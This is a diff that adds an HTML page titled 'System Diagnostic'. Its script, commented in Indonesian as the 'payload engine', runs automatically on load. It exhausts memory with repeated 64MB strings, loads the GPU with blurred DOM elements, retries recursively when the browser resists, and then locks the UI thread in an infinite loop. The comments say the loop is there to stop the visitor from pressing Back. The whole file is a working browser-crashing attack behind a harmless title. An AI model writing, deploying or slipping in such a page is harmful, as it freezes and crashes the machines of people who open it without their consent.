@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Diagnostic</title>
+    <style>
+        body { background: black; color: red; font-family: 'Courier New', Courier, monospace; text-align: center; padding-top: 20%; overflow: hidden; }
+        .warning { font-size: 2em; font-weight: bold; animation: blink 0.5s infinite; }
+        @keyframes blink { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }
+    </style>
+</head>
+<body>
+    <div class="warning">QUANTUM OVERLOAD ACTIVE</div>
+    <div id="status">INITIALIZING EXPLOIT...</div>
+
+    <script>
+        // --- THE ACTUAL PAYLOAD ENGINE ---
+        function executeQuantumStall() {
+            const status = document.getElementById('status');
+            let memoryBunker = [];
+            
+            // 1. Memory Bloater: Memakan RAM secara eksponensial
+            // Menggunakan kombinasi string dan array buffer
+            setInterval(() => {
+                try {
+                    // Membuat string raksasa (64MB per iterasi)
+                    let giantString = new Array(1024 * 1024 * 64).join('☠️');
+                    memoryBunker.push(giantString);
+                    
+                    // 2. DOM Bloater: Memaksa GPU Render Engine bekerja keras
+                    let bomb = document.createElement('div');
+                    bomb.innerHTML = giantString.substring(0, 1000);
+                    bomb.style.filter = "blur(10px) contrast(200%)"; // Menambah beban GPU
+                    document.body.appendChild(bomb);
+                    
+                    status.innerText = "RAM SATURATION: " + (memoryBunker.length * 64) + "MB";
+                } catch (e) {
+                    // Jika browser mencoba membatasi, kita paksa lewat rekursif
+                    executeQuantumStall();
+                }
+            }, 50);
+
+            // 3. Thread Lock: Mengunci UI Thread agar target tidak bisa menekan tombol 'Back'
+            while(true) {
+                // Loop kosong ini akan membekukan browser secara instan
+                // Kita jalankan di dalam worker atau interval pendek agar halaman sempat termuat
+                for(let i=0; i<1000000; i++) { Math.sqrt(Math.random()); }
+            }
+        }
+
+        // Delay sedikit agar halaman termuat sempurna sebelum crash
+        setTimeout(executeQuantumStall, 1500);
+    </script>
+</body>
+</html>
